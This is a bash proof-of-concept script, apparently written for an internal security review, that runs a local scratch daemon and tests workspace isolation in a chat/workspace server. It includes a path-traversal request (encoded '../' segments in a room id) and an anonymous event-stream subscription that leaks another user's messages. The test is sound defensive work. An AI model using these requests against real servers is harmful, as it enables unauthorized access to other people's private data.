#!/usr/bin/env bash
# 原子③ isolation審 — live PoC (scratch daemon, own GAIA_HOME + port, real 8787 untouched).
# TARGET: main commits 20623c3 (validate ownership) · 58d12c5 (scope workspaces to owners) · 57358ca (test).
# Run against a checkout that CONTAINS those commits (this room branch does NOT — use a detached
#   worktree at 57358ca with node_modules symlinked from the main repo).
# NO SOURCE EDITS. read/attack only.
#
# Result summary (2026-08-18, port 8815):
#   A roomId path traversal (../ via %2F) .......... BLOCKED (assertRoomId 500)      PASS
#   B cross-owner REST (bob -> alice ws) ........... 403 findForHuman                PASS
#   C1 ANON SSE /api/events?workspaceId=<alice> .... FULL LEAK (text+humanId+snapshot) FAIL/HIGH
#   C2 owned bob SSE -> alice ws ................... 403                              PASS(one-way wall)
#
# ROOT CAUSE (C1): ownership guard (registry.findForHuman) is applied to
#   /api/workspaces/*, /api/files, /api/search, and the OWNED-user branch of
#   /api/events — but the anonymous/legacy (scope-less) branch of GET /api/events
#   never calls findForHuman. broadcast() (http.ts ~1893) delivers by client
#   self-declared workspaceId/roomId. An outsider with NO session supplies the
#   target workspace id and receives its live room-events + full snapshot.
#   Same failure family as the CONFIRMED SSE membership hole (L1): stream
#   authorization is by client self-declaration, not server-side authz.
set -euo pipefail
PORT=${PORT:-8815}; H=127.0.0.1; B="http://$H:$PORT"
SB=$(mktemp -d /tmp/ghoul-iso.XXXXXX); mkdir -p "$SB/home" "$SB/alice-home/ws" "$SB/bob-home/ws"
CODE=${CODE:?set CODE=/path/to/checkout-with-ownership-commits}
( cd "$SB" && GAIA_HOME="$SB/home" GAIA_PORT=$PORT GAIA_HOST=$H bun "$CODE/src/cli.ts" >"$SB/d.log" 2>&1 & echo $! >"$SB/pid" )
sleep 5
AH="$SB/alice-home"; AW="$SB/alice-home/ws"
curl -s -c "$SB/a.ck" -X POST "$B/api/auth/users" -H 'content-type: application/json' \
  -d "{\"username\":\"alice\",\"password\":\"pw\",\"home\":\"$AH\",\"workspace\":\"$AW\"}"
curl -s -c "$SB/a.ck" -X POST "$B/api/auth/login" -H 'content-type: application/json' -d '{"username":"alice","password":"pw"}' >/dev/null
WS=$(curl -s -b "$SB/a.ck" "$B/api/app" | python3 -c "import sys,json;print(json.load(sys.stdin)['currentWorkspaceId'])")
echo "alice owned workspace id = $WS"
curl -s -b "$SB/a.ck" -X POST "$B/api/workspaces/$WS/rooms/general/messages" -H 'content-type: application/json' -d '{"text":"OWNED-SECRET","queue":true}' >/dev/null
# A: traversal
curl -s -w '\nA HTTP=%{http_code}\n' -b "$SB/a.ck" -X POST "$B/api/workspaces/$WS/rooms/..%2F..%2F..%2Fetc/messages" -H 'content-type: application/json' -d '{"text":"t"}'
# C1: anonymous SSE leak
( timeout 8 curl -s -N "$B/api/events?workspaceId=$WS&roomId=general" >"$SB/anon.sse" & )
sleep 2
curl -s -b "$SB/a.ck" -X POST "$B/api/workspaces/$WS/rooms/general/messages" -H 'content-type: application/json' -d '{"text":"LIVE-LEAK-PROBE","queue":true}' >/dev/null
sleep 4
echo "=== anon SSE leaked lines ==="; grep -aE "LIVE-LEAK-PROBE|OWNED-SECRET|room-event" "$SB/anon.sse" | head
kill "$(cat "$SB/pid")" 2>/dev/null || true; rm -rf "$SB"
